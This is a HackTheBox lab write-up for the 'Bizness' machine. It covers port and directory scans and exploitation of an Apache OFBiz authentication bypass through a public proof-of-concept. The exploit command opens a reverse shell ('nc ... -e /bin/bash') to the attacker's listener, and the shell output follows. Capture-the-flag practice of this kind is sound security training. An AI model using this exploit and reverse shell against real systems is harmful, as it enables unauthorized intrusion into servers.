# HackTheBox Bizness Writeup

## Nmap
```bash
Nmap scan report for 10.10.11.252
Host is up, received user-set (0.021s latency).
Scanned at 2024-02-08 16:19:40 +08 for 838s
Not shown: 65436 closed tcp ports (reset), 95 filtered tcp ports (no-response)
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp   open  ssl/http   syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://bizness.htb/
33529/tcp open  tcpwrapped syn-ack ttl 63
```

Visiting http://10.10.11.252 redirects us to https://bizness.htb/. So add bizness.htb to host file and refresh the page.
```bash
vi /etc/hosts

10.10.11.252  bizness.htb
```

### Directory Buster
```bash
dirb https://bizness.htb/       

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb  8 16:22:20 2024
URL_BASE: https://bizness.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://bizness.htb/ ----
==> DIRECTORY: https://bizness.htb/accounting/                                                                      
==> DIRECTORY: https://bizness.htb/ap/                                                                              
==> DIRECTORY: https://bizness.htb/ar/                                                                              
==> DIRECTORY: https://bizness.htb/catalog/                                                                         
==> DIRECTORY: https://bizness.htb/common/                                                                          
==> DIRECTORY: https://bizness.htb/content/                                                                         
+ https://bizness.htb/control (CODE:200|SIZE:34633)                                                                 
==> DIRECTORY: https://bizness.htb/ebay/                                                                            
==> DIRECTORY: https://bizness.htb/ecommerce/                                                                       
+ https://bizness.htb/error (CODE:302|SIZE:0)                                                                       
==> DIRECTORY: https://bizness.htb/example/                                                                         
==> DIRECTORY: https://bizness.htb/images/                                                                          
+ https://bizness.htb/index.html (CODE:200|SIZE:27200)                                                              
==> DIRECTORY: https://bizness.htb/marketing/                                                                       
==> DIRECTORY: https://bizness.htb/passport/
```

### Apache Ofbiz
Visiting to https://bizness.htb/accounting/ shows a login page for Apache Ofbiz. Simple googling shows Apache OFBiz Authentication Bypass Vulnerability
```bash
# POC: https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
cd Apache-OFBiz-Authentication-Bypass

# Start a listener
rlwrap nc -lnvp 1234

# Connect back to the listener
python3 exploit.py --url https://bizness.htb --cmd 'nc 10.10.14.46 1234 -e /bin/bash'
```

## User Flag
```bash
rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.46] from (UNKNOWN) [10.10.11.252] 33080
ofbiz@bizness:/opt/ofbiz$ id
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)

ofbiz@bizness:/opt/ofbiz$ ls -la /home/ofbiz
total 36
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Feb  8 02:21 .
drwxr-xr-x 3 root  root           4096 Dec 21 09:15 ..
lrwxrwxrwx 1 root  root              9 Dec 16 05:21 .bash_history -> /dev/null
-rw-r--r-- 1 ofbiz ofbiz-operator  220 Dec 14 14:24 .bash_logout
-rw-r--r-- 1 ofbiz ofbiz-operator 3560 Dec 14 14:30 .bashrc
drwxr-xr-x 8 ofbiz ofbiz-operator 4096 Dec 21 09:15 .gradle
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 .java
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Feb  8 02:21 .local
-rw-r--r-- 1 ofbiz ofbiz-operator  807 Dec 14 14:24 .profile
-rw-r----- 1 root  ofbiz-operator   33 Feb  8 02:10 user.txt
```

## Root Flag
Root flag sucks, not including
